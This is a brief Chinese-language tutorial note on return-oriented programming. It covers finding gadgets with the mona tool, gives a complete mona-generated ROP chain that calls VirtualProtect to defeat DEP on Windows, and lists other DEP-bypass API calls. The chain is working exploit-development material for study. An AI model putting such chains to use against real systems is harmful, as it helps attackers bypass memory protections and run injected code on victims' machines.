# Return-oriented programming（返回导向编程）

寻找 gadgets
找到可用的 如</br>
```
pop eax
ret
```

这些 gadgets 可以是简单的诸如 pop 指令、mov 指令等操作码序列，关键是要以 ret 指令结尾，以便能够控制程序流程</br>
通过mona工具快速找到部件</br>
命令`!mona rop -m *.dll`或`!mona rop`

### 构造 ROP 链
基于找到的 gadgets 和规划好的攻击流程，将 gadgets 按照正确的顺序排列在栈上
~~~
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x7647d922,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x761415a4,  # ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x763ddf7a,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x77dec2c6,  # XCHG EAX,ESI # RETN [ntdll.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x77c5d01f,  # POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x76368aa5,  # & call esp [KERNELBASE.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x764af47a,  # POP EBX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x77bc2af0,  # POP EDX # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x77c1164a,  # POP ECX # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x75aef984,  # &Writable location [VCRUNTIME140.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x77bcff89,  # POP EDI # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x7610bfca,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x7610b475,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x764d3784,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
~~~
### 对抗DEP
关闭dep</br>
NtSetlnformationProcess(SetProcessDEPPolicy)</br>
修改内存属性</br>
VirtualProtected</br>
申请可执行的内存</br>
VirtulAlloc</br>